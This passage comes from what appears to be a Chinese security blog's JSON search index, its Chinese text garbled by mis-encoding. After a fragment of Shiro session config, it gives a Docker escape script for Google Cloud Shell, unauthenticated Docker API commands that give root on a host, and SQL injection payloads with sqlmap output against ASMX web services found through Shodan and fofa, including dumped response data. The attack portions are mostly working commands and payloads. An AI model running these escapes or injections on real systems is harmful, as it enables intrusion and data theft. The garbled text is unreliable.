æˆçš„å­¤ç«‹ä¼šè¯--&gt;&lt;propertyname=\"sessionValidationInterval\"value=\"${session.sessionTimeoutClean}\"/&gt;&lt;!--&lt;propertyname=\"sessionValidationSchedulerEnabled\"value=\"false\"/&gt;--&gt;&lt;propertyname=\"sessionValidationSchedulerEnabled\"value=\"true\"/&gt;&lt;propertyname=\"sessionIdCookie\"ref=\"sessionIdCookie\"/&gt;&lt;propertyname=\"sessionIdCookieEnabled\"value=\"true\"/&gt;&lt;/bean&gt;&lt;!--æŒ‡å®šæœ¬ç³»ç»ŸSESSIONID,é»˜è®¤ä¸º:JSESSIONIDé—®é¢˜:ä¸SERVLETå®¹å™¨åå†²çª,å¦‚JETTY,TOMCATç­‰é»˜è®¤JSESSIONID,å½“è·³å‡ºSHIROSERVLETæ—¶å¦‚ERROR-PAGEå®¹å™¨ä¼šä¸ºJSESSIONIDé‡æ–°åˆ†é…å€¼å¯¼è‡´ç™»å½•ä¼šè¯ä¸¢å¤±!--&gt;&lt;beanid=\"sessionIdCookie\"class=\"org.apache.shiro.web.servlet.SimpleCookie\"&gt;&lt;constructor-argname=\"name\"value=\"jeesite.session.id\"/&gt;&lt;propertyname=\"path\"value=\"/\"/&gt;&lt;/bean&gt;&lt;!--è‡ªå®šä¹‰Sessionå­˜å‚¨å®¹å™¨--&gt;&lt;beanid=\"sessionDAO\"class=\"com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO\"&gt;&lt;propertyname=\"sessionIdGenerator\"ref=\"idGen\"/&gt;&lt;propertyname=\"sessionKeyPrefix\"value=\"${redis.keyPrefix}:user:session_\"/&gt;&lt;/bean&gt;&lt;!--&lt;beanid=\"sessionDAO\"class=\"com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO\"&gt;&lt;propertyname=\"sessionIdGenerator\"ref=\"idGen\"/&gt;&lt;propertyname=\"activeSessionsCacheName\"value=\"activeSessionsCache\"/&gt;&lt;propertyname=\"cacheManager\"ref=\"shiroCacheManager\"/&gt;&lt;/bean&gt;--&gt;&lt;!--å®šä¹‰æˆæƒç¼“å­˜ç®¡ç†å™¨--&gt;&lt;!--&lt;beanid=\"shiroCacheManager\"class=\"com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager\"/&gt;--&gt;&lt;beanid=\"shiroCacheManager\"class=\"org.apache.shiro.cache.ehcache.EhCacheManager\"&gt;&lt;propertyname=\"cacheManager\"ref=\"cacheManager\"/&gt;&lt;/bean&gt;&lt;!--ä¿è¯å®ç°äº†Shiroå†…éƒ¨lifecycleå‡½æ•°çš„beanæ‰§è¡Œ--&gt;&lt;beanid=\"lifecycleBeanPostProcessor\"class=\"org.apache.shiro.spring.LifecycleBeanPostProcessor\"/&gt;&lt;!--AOPå¼æ–¹æ³•çº§æƒé™æ£€æŸ¥--&gt;&lt;beanclass=\"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator\"depends-on=\"lifecycleBeanPostProcessor\"&gt;&lt;propertyname=\"proxyTargetClass\"value=\"true\"/&gt;&lt;/bean&gt;&lt;beanclass=\"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor\"&gt;&lt;propertyname=\"securityManager\"ref=\"securityManager\"/&gt;&lt;/bean&gt;&lt;/beans&gt;ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€ŒDOCKERã€:è°ˆè°ˆdockeré€ƒé€¸é‚£ç‚¹äº‹",
    "category" : "",
    "tags"     : "æ¼æ´å¤ç°, ç¬”è®°, docker, CVE",
    "url"      : "/blog/2020/docker/escape/",
    "date"     : "May 17, 2020",
    "content"  : "GoogleCloudShellDockeré€ƒé€¸sudodocker-Hunix:///google/host/var/run/docker.sockpullalpine:latestWelcometoCloudShell!Type\"help\"togetstarted.YourCloudPlatformprojectinthissessionissettoavid-rope-267508.Useâ€œgcloudconfigsetproject[PROJECT_ID]â€tochangetoadifferentproject.chihou_pro@cloudshell:~(avid-rope-267508)$sudosuroot@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#lsREADME-cloudshell.txtå¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œä½¿ç”¨äº†dockerå®¹å™¨ï¼Œå‚è€ƒï¼šroot@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#cat/proc/1/cgroup12:hugetlb:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b11:perf_event:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b10:cpu,cpuacct:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b9:cpuset:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b8:memory:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b7:devices:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b6:freezer:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b5:blkio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b4:rdma:/3:pids:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b2:net_cls,net_prio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b1:name=systemd:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b0::/system.slice/containerd.serviceå‘ç°dockeræˆ‘ä»¬å¯ä»¥çœ‹åˆ°kubepodsç­‰å…³é”®è¯ï¼Œæµè§ˆäº†æ–‡ä»¶ç³»ç»Ÿä¹‹åï¼Œæ³¨æ„åˆ°æœ‰2ä¸ªDockerunixå¥—æ¥å­—å¯ç”¨ã€‚åœ¨/run/docker.sockä¸­ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨CloudShellä¸­è¿è¡Œçš„Dockerå®¢æˆ·ç«¯çš„é»˜è®¤è·¯å¾„ã€‚root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/#catrun/docker/docker.sockgoogle/metrics/postgresql/sshd/supervisor.pidxtables.lockdocker.piddocker-ssd.pidlock/mount/rsyslogd.pidsshd.pidutmp/google/host/var/run/docker.sockå¥—æ¥å­—ï¼Œè¿™æ˜¯ç¬¬äºŒä¸ªã€‚root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/#ls/google/host/var/run/agetty.reloadcloud-initcommand-recordercrash_reporterdockerdockershim.sockinitctllockboxlvmmetricssshd.pidsystemdtmpfiles.duservmblkidcloudshell-credscontainerddbusdocker.piddocker.socklocklogmachine-idmountsudotheiaudevutmpxtables.lockç„¶åæ ¹æ®ä¸Šé¢çš„å¯åˆ©ç”¨å¥—æ¥å­—å‡†å¤‡ä¸€ä¸ªbashæ–‡ä»¶è¿›è¡Œdockeré€ƒé€¸:-)newabashfiletoescapedockeringoogle_cloud_shell.sudodocker-Hunix:///google/host/var/run/docker.sockpullalpine:latestsudodocker-Hunix:///google/host/var/run/docker.sockrun-d-it--nameLiveOverflow-container-v\"/proc:/host/proc\"-v\"/sys:/host/sys\"-v\"/:/rootfs\"--network=host--privileged=true--cap-add=ALLalpine:latestsudodocker-Hunix:///google/host/var/run/docker.sockstartLiveOverflow-containersudodocker-Hunix:///google/host/var/run/docker.sockexec-itLiveOverflow-container/bin/shè¿è¡Œbashæ–‡ä»¶root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#bashdocker_escape.shlatest:Pullingfromlibrary/alpineDigest:sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01Status:Imageisuptodateforalpine:latestdocker.io/library/alpine:latestdocker:Errorresponsefromdaemon:Conflict.Thecontainername\"/LiveOverflow-container\"isalreadyinusebycontainer\"2e2896994c459d7be0a6acb613c8be509ef5158cb97ddac4b5e30b2fed770d56\".Youhavetoremove(orrename)thatcontainertobeabletoreusethatname.See'dockerrun--help'.LiveOverflow-container/#whoamirootå¦‚ä¸Šï¼Œé€ƒé€¸æˆåŠŸdockerdaemonapiæ¼æ´å¤ç°éªŒè¯æ¼æ´å­˜åœ¨ï¼š[root@iZ2ze9ebgot9gy5c2mi5ecZunauthorized-rce]#curlhttp://vuln_docker_ip:2375/info{\"ID\":\"OY55:HR25:LKHP:XTLU:LCID:Y64D:46WQ:4T5U:U2SF:5PVW:R7I3:T6KV\",\"Containers\":2,\"ContainersRunning\":1,\"ContainersPaused\":0,\"ContainersStopped\":1,\"Images\":1,\"Driver\":\"overlay2\",\"DriverStatus\":[[\"BackingFilesystem\",\"extfs\"],[\"Supportsd_type\",\"true\"],[\"NativeOverlayDiff\",\"true\"]],\"SystemStatus\":null,\"Plugins\":{\"Volume\":[\"local\"],\"Network\":[\"bridge\",\"host\",\"macvlan\",\"null\",\"overlay\"],\"Authorization\":null,\"Log\":[\"awslogs\",\"fluentd\",\"gcplogs\",\"gelf\",\"journald\",\"json-file\",\"logentries\",\"splunk\",\"syslog\"]},\"MemoryLimit\":true,\"SwapLimit\":true,\"KernelMemory\":true,\"CpuCfsPeriod\":true,\"CpuCfsQuota\":true,\"CPUShares\":true,\"CPUSet\":true,\"IPv4Forwarding\":true,\"BridgeNfIptables\":false,\"BridgeNfIp6tables\":false,\"Debug\":false,\"NFd\":29,\"OomKillDisable\":true,\"NGoroutines\":51,\"SystemTime\":\"2020-05-22T02:44:08.778253143Z\",\"LoggingDriver\":\"json-file\",\"CgroupDriver\":\"cgroupfs\",\"NEventsListener\":0,\"KernelVersion\":\"3.10.0-1062.12.1.el7.x86_64\",\"OperatingSystem\":\"AlpineLinuxv3.7(containerized)\",\"OSType\":\"linux\",\"Architecture\":\"x86_64\",\"IndexServerAddress\":\"https://index.docker.io/v1/\",\"RegistryConfig\":{\"AllowNondistributableArtifactsCIDRs\":[],\"AllowNondistributableArtifactsHostnames\":[],\"InsecureRegistryCIDRs\":[\"127.0.0.0/8\"],\"IndexConfigs\":{\"docker.io\":{\"Name\":\"docker.io\",\"Mirrors\":[],\"Secure\":true,\"Official\":true}},\"Mirrors\":[]},\"NCPU\":2,\"MemTotal\":3973296128,\"GenericResources\":null,\"DockerRootDir\":\"/var/lib/docker\",\"HttpProxy\":\"\",\"HttpsProxy\":\"\",\"NoProxy\":\"\",\"Name\":\"14e1a228e781\",\"Labels\":[],\"ExperimentalBuild\":false,\"ServerVersion\":\"18.03.0-ce\",\"ClusterStore\":\"\",\"ClusterAdvertise\":\"\",\"Runtimes\":{\"runc\":{\"path\":\"docker-runc\"}},\"DefaultRuntime\":\"runc\",\"Swarm\":{\"NodeID\":\"\",\"NodeAddr\":\"\",\"LocalNodeState\":\"inactive\",\"ControlAvailable\":false,\"Error\":\"\",\"RemoteManagers\":null},\"LiveRestoreEnabled\":false,\"Isolation\":\"\",\"InitBinary\":\"docker-init\",\"ContainerdCommit\":{\"ID\":\"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c\",\"Expected\":\"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c\"},\"RuncCommit\":{\"ID\":\"4fc53a81fb7c994640722ac585fa9ca548971871\",\"Expected\":\"4fc53a81fb7c994640722ac585fa9ca548971871\"},\"InitCommit\":{\"ID\":\"949e6fa\",\"Expected\":\"949e6fa\"},\"SecurityOptions\":[\"name=seccomp,profile=default\"]}å¦‚ä¸Šï¼Œè®¿é—®infoç›®å½•è¿”å›äº†å…³äºdockerçš„ä¿¡æ¯ã€‚ç›´æ¥æ”»å‡»æœºè¿è¡Œå‘½ä»¤ï¼šroot@shell:/home/tool/docker/unauth_rce#docker-H=tcp://vuln_docker_ip:2375run-it-v/:/tmp--entrypoint/bin/shalpine:latest/#whoamiroot/#uname-aLinuxaa5ae15c12f03.10.0-1062.12.1.el7.x86_64#1SMPTueFeb423:02:59UTC2020x86_64Linux/#ifconfigeth0Linkencap:EthernetHWaddr02:42:AC:11:00:02inetaddr:172.17.0.2Bcast:172.17.255.255Mask:255.255.0.0UPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:8errors:0dropped:0overruns:0frame:0TXpackets:0errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:656(656.0B)TXbytes:0(0.0B)loLinkencap:LocalLoopbackinetaddr:127.0.0.1Mask:255.0.0.0UPLOOPBACKRUNNINGMTU:65536Metric:1RXpackets:0errors:0dropped:0overruns:0frame:0TXpackets:0errors:0dropped:0overruns:0carrier:0éœ‡æƒŠæœ‰æœ¨æœ‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é¶åœºä¸Šå¤ç°ï¼Œç°åœ¨åœ¨æ’’æ—¦ä¸Šã€fofaä¸Šéƒ½å¾ˆå°‘èƒ½æ‰¾åˆ°è¿™ç§ç¨‹åº¦çš„æ¼æ´äº†ï¼›åœ¨å®¿ä¸»æœºä¸ŠæŸ¥çœ‹dockerä¿¡æ¯ï¼š[root@shellunauthorized-rce]#bash/home/docker_shell_exe.shdocker0Linkencap:EthernetHWaddr02:42:ED:E8:4E:97inetaddr:172.17.0.1Bcast:172.17.255.255Mask:255.255.0.0inet6addr:fe80::42:edff:fee8:4e97/64Scope:LinkUPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:0errors:0dropped:0overruns:0frame:0TXpackets:3errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:0(0.0B)TXbytes:266(266.0B)eth0Linkencap:EthernetHWaddr02:42:AC:14:00:02inetaddr:172.20.0.2Bcast:0.0.0.0Mask:255.255.0.0inet6addr:fe80::42:acff:fe14:2/64Scope:LinkUPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:45363errors:0dropped:0overruns:0frame:0TXpackets:41902errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:10257217(9.7MiB)TXbytes:3704534(3.5MiB)loLinkencap:LocalLoopbackinetaddr:127.0.0.1Mask:255.0.0.0inet6addr:::1/128Scope:Hostinet6addr:::1/128Scope:HostUPLOOPBACKRUNNINGMTU:65536Metric:1RXpackets:55errors:0dropped:0overruns:0frame:0TXpackets:55errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:1000RXbytes:6487(6.3KiB)TXbytes:6487(6.3KiB)è¿”å›çš„ä¿¡æ¯å¦‚ä¸Šï¼Œä¸æˆ‘ä»¬æ‰€ä½¿ç”¨çš„é¶æœºæœºå™¨ä¸€è‡´ï¼›"
  },

  {
    "title"    : "ã€Œæ¸—é€ã€:SQLæ³¨å…¥æ–°å§¿åŠ¿:)",
    "category" : "",
    "tags"     : "Web, ç¬”è®°, æ¸—é€",
    "url"      : "/blog/2020/wsdl/inject/",
    "date"     : "May 15, 2020",
    "content"  : "ç”±äºä¸€äº›æœºç¼˜å·§åˆï¼Œå‘ç°äº†ä¸€äº›SQLæ³¨å…¥çš„æ–°å§¿åŠ¿ï¼Œè®°å½•ä¸€ä¸‹ï¼›è®°å½•å°±æ˜¯ä¸€ä¸ªç®€å•çš„ç»ƒæ‰‹è®°å½•ï¼Œæ„Ÿè§‰éå¸¸æœ‰æ„æ€ï¼›ç›®æ ‡ç¡®å®šåœ¨shodanã€fofaä¸Šæœasmxï¼Œæ‰¾åˆ°ç–‘ä¼¼å­˜åœ¨wsdlæ³¨å…¥çš„ç«™ï¼Œå¤§æ¦‚çš„æ˜¯è¿™æ ·çš„ï¼šhttp://vuln_ip:8081/WebService1.asmx?WSDLï¼Œä¸€èˆ¬æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰‹å·¥çš„æ–¹å¼å»å°è¯•æ³¨å…¥ï¼Œè¿™æ ·çš„ç«™è®¿é—®è¿›å»åæ˜¯ç±»ä¼¼xmlçš„æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯å„ç§ä¸æœåŠ¡å™¨äº¤äº’çš„å‚æ•°ï¼Œæ¯”å¦‚ç™»å½•é¡µé¢çš„usernameã€passwdå‚æ•°ï¼Œå¼€å‘è€…ä»¬éƒ½å·²ç»é…ç½®å¥½è¿™äº›å‚æ•°ï¼›å¦‚ä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå‚æ•°å¯¹åº”çš„xmlæ ‡ç­¾ï¼š&lt;s:elementname=\"HelloWorldResponse\"&gt;&lt;s:complexType&gt;&lt;s:sequence&gt;&lt;s:elementminOccurs=\"0\"maxOccurs=\"1\"name=\"HelloWorldResult\"type=\"s:string\"/&gt;&lt;/s:sequence&gt;&lt;/s:complexType&gt;&lt;/s:element&gt;sqlmapä¸€æŠŠæ¢­wsdlæ³¨å…¥æˆ‘ä»¬æ‰‹å·¥çš„æ–¹å¼æ˜¯æ„é€ ä¸€ä¸ªSOAPå¯¹åº”çš„å‚æ•°çš„poståŒ…å‘ç»™asmxç½‘é¡µã€‚poståŒ…å¦‚ä¸‹ï¼š&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:HelloWorldResult&gt;&lt;urn:ins&gt;1*&lt;/urn:ins&gt;&lt;/urn:HelloWorldResult&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;å¤§è‡´çš„ä¸€ä¸ªæ„é€ æ€è·¯å°±æ˜¯è¿™æ ·çš„ï¼Œç„¶åè§‚å¯ŸæœåŠ¡å™¨æ•°æ®åº“çš„æŠ¥é”™æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠæ•°æ®poståŒ…æ‹¿è¿‡æ¥è·‘ï¼šroot@#:/home/tool/sqlmap-data/wsdl-inject#sqlmap-rnet-test1.txt--batch_____H________[.]___________{1.2.4#stable}|_-|.[(]|.'|.||___|_[\"]_|_|_|__,|_||_|V|_|http://sqlmap.org[!]legaldisclaimer:Usageofsqlmapforattackingtargetswithoutpriormutualconsentisillegal.Itistheenduser'sresponsibilitytoobeyallapplicablelocal,stateandfederallaws.Developersassumenoliabilityandarenotresponsibleforanymisuseordamagecausedbythisprogram[*]startingat11:03:20[11:03:54][INFO]testingMicrosoftSQLServer[11:03:54][INFO]confirmingMicrosoftSQLServer[11:04:24][CRITICAL]connectiontimedouttothetargetURL.sqlmapisgoingtoretrytherequest(s)[11:04:24][INFO]theback-endDBMSisMicrosoftSQLServerwebserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:04:24][WARNING]HTTPerrorcodesdetectedduringrun:500(InternalServerError)-19times[11:04:24][INFO]fetcheddataloggedtotextfilesunder'/root/.sqlmap/output/underattack-host'[*]shuttingdownat11:04:24æ³¨å…¥payloadå•ç‹¬å‘å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š---Parameter:SOAP#1*((custom)POST)Type:error-basedTitle:MicrosoftSQLServer/SybaseANDerror-based-WHEREorHAVINGclause(IN)Payload:&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:getcode&gt;&lt;urn:ins&gt;1'AND1597IN(SELECT(CHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT(CASEWHEN(1597=1597)THENCHAR(49)ELSECHAR(48)END))+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113)))AND'DZUD'='DZUD&lt;/urn:ins&gt;&lt;/urn:getcode&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;Type:UNIONqueryTitle:GenericUNIONquery(NULL)-7columnsPayload:&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:getcode&gt;&lt;urn:ins&gt;1'UNIONALLSELECTCHAR(113)+CHAR(112)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(72)+CHAR(117)+CHAR(78)+CHAR(90)+CHAR(84)+CHAR(69)+CHAR(80)+CHAR(98)+CHAR(85)+CHAR(102)+CHAR(80)+CHAR(86)+CHAR(81)+CHAR(73)+CHAR(83)+CHAR(102)+CHAR(106)+CHAR(101)+CHAR(70)+CHAR(113)+CHAR(101)+CHAR(109)+CHAR(68)+CHAR(86)+CHAR(76)+CHAR(84)+CHAR(73)+CHAR(122)+CHAR(99)+CHAR(66)+CHAR(82)+CHAR(119)+CHAR(66)+CHAR(78)+CHAR(75)+CHAR(98)+CHAR(102)+CHAR(107)+CHAR(99)+CHAR(88)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL--aKgd&lt;/urn:ins&gt;&lt;/urn:getcode&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;---æˆ‘ä»¬å¯ä»¥å·æ‡’ä¸€ä¸‹ï¼Œç›´æ¥payloadæ‹¿è¿‡æ¥çœ‹çœ‹ååŒ…æœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„åœ°æ–¹~çœ‹åˆ°å·®åˆ«äº†å—ã€‚Type:æŠ¥é”™æ³¨å…¥ï¼ˆerror-basedï¼‰:HTTP/1.1500InternalServerErrorCache-Control:privateContent-Type:text/xml;charset=utf-8Server:Microsoft-IIS/7.5X-AspNet-Version:4.0.30319X-Powered-By:ASP.NETContent-Length:459&lt;?xmlversion=\"1.0\"encoding=\"utf-8\"?&gt;&lt;soap:Envelopexmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server&lt;/faultcode&gt;&lt;faultstring&gt;Serverwasunabletoprocessrequest.---&amp;gt;åœ¨å°†varcharå€¼'qpbzq1qzkxq'è½¬æ¢æˆæ•°æ®ç±»å‹&lt;/faultstring&gt;&lt;detail/&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;#=======================================================================================#=======================================================================================Type:è”åˆæŸ¥è¯¢ï¼ˆUNIONqueryï¼‰ï¼Œè¾“å‡ºçš„ä¿¡æ¯æ¯”è¾ƒå¤šï¼Œé™äºç¯‡å¹…ï¼Œæ”¾ä¸Šä¸€äº›æ•°æ®ï¼šHTTP/1.1200OKCache-Control:private,max-age=0Content-Type:text/xml;charset=utf-8Vary:Accept-EncodingServer:Microsoft-IIS/7.5X-AspNet-Version:4.0.30319X-Powered-By:ASP.NETContent-Length:20111&lt;c_me_com&gt;10005&lt;/c_me_com&gt;&lt;c_me_no&gt;14&lt;/c_me_no&gt;&lt;c_me_bt&gt;10.11.201.233&lt;/c_me_bt&gt;&lt;c_me_command&gt;0&lt;/c_me_command&gt;&lt;c_me_lenght&gt;2&lt;/c_me_lenght&gt;&lt;c_me_start&gt;2000&lt;/c_me_start&gt;&lt;c_me_lastvalue&gt;0&lt;/c_me_lastvalue&gt;&lt;c_me_maxstep&gt;50&lt;/c_me_maxstep&gt;&lt;c_me_webcode&gt;com7.db001.db001t&lt;/c_me_webcode&gt;&lt;c_me_by19&gt;0.00&lt;/c_me_by19&gt;&lt;c_me_by20&gt;1&lt;/c_me_by20&gt;&lt;c_me_lastdate4&gt;2018-08-08T05:00:24.677+08:00&lt;/c_me_lastdate4&gt;&lt;c_me_lastvalue4&gt;313&lt;/c_me_lastvalue4&gt;&lt;c_me_lastdate3&gt;2018-08-08T06:03:06.137+08:00&lt;/c_me_lastdate3&gt;&lt;c_me_lastvalue3&gt;313&lt;/c_me_lastvalue3&gt;&lt;c_me_lastdate2&gt;2018-08-08T07:05:47.173+08:00&lt;/c_me_lastdate2&gt;&lt;c_me_lastvalue2&gt;313&lt;/c_me_lastvalue2&gt;&lt;c_me_lastdate1&gt;2018-08-08T08:08:28.543+08:00&lt;/c_me_lastdate1&gt;&lt;c_me_lastvalue1&gt;313&lt;/c_me_lastvalue1&gt;&lt;c_me_lastsuredate&gt;2018-08-08T11:11:05.27+08:00&lt;/c_me_lastsuredate&gt;&lt;c_me_lastsurevalue&gt;313&lt;/c_me_lastsurevalue&gt;&lt;/d2&gt;&lt;/ds&gt;&lt;/diffgr:diffgram&gt;&lt;/getcodeResult&gt;&lt;/getcodeResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;å¸¸è§„æŸ¥è¯¢ï¼šå½“ç„¶åœ¨å¹³å¸¸æ³¨å…¥çš„è¿‡ç¨‹ä¸­ï¼Œä¸ä»…ä»…å­˜åœ¨ä¸Šè¿°çš„æ³¨å…¥ï¼Œæˆ‘ä»¬æ›´å¤šçš„æ˜¯å¸¸è§çš„ç›²æ³¨ã€è”åˆæŸ¥è¯¢æˆ–è€…æ˜¯å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ç­‰ç­‰ï¼›æˆ‘ä»¬è¿™é‡Œä¸¾å¾—ä¾‹å­åŒæ ·å­˜åœ¨ï¼Œå½“ç„¶ä¹Ÿæ˜¯ä¸‡èƒ½çš„awvsè·‘å‡ºæ¥çš„ï¼šDiscoveredbyBlindSQLInjectionURLencodedPOSTinputinswassettoeizSlsæŸ¥çœ‹ä¸åŒè¾“å…¥çš„ç¬¦å·å¯¹åº”çš„trueã€flaseå€¼ï¼Œå•æ•°çš„%27è¾“å…¥è¿›å»æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯flaseï¼ŒåŒæ•°è¾“å…¥è¿›å»åˆ™ä¸ºtrueï¼š462'=&gt;ERROR462''=&gt;OKGwHgee'''=&gt;ERROR7Ahb38''''=&gt;OKCXBMlX'''''=&gt;ERRORxgBDwt''''''=&gt;OKeizSls'''''''=&gt;ERRORè€æ–¹æ³•ï¼Œç›´æ¥SQLMAPè·‘~POST/WebService1.asmx/getcodeHTTP/1.1Content-Type:application/x-www-form-urlencodedX-Requested-With:XMLHttpRequestReferer:http://vuln_ip:8081/WebService1.asmx?WSDLAccept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding:gzip,deflateContent-Length:17Host:vuln_ip:8081User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/73.0.3683.103Safari/537.36Connection:Keep-aliveins=eizSlsè·‘å‡ºæ¥ä¹Ÿæ˜¯ä¸€æ ·çš„æ•ˆæœï¼Œå½“ç„¶æ˜¯ä¸€æ ·çš„æ³¨å…¥ç‚¹ï¼Œéƒ½æ˜¯getcodeè¿™ä¸ªåŠŸèƒ½æ¥å£è·‘çš„æ•°æ®ï¼šPOSTparameter'ins'isvulnerable.Doyouwanttokeeptestingtheothers(ifany)?[y/N]Nsqlmapidentifiedthefollowinginjectionpoint(s)withatotalof47HTTP(s)requests:---Parameter:ins(POST)Type:error-basedTitle:MicrosoftSQLServer/SybaseANDerror-based-WHEREorHAVINGclause(IN)Payload:ins=eizSls'AND7541IN(SELECT(CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT(CASEWHEN(7541=7541)THENCHAR(49)ELSECHAR(48)END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)))AND'EJIL'='EJILType:UNIONqueryTitle:GenericUNIONquery(NULL)-7columnsPayload:ins=eizSls'UNIONALLSELECTNULL,CHAR(113)+CHAR(120)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(67)+CHAR(85)+C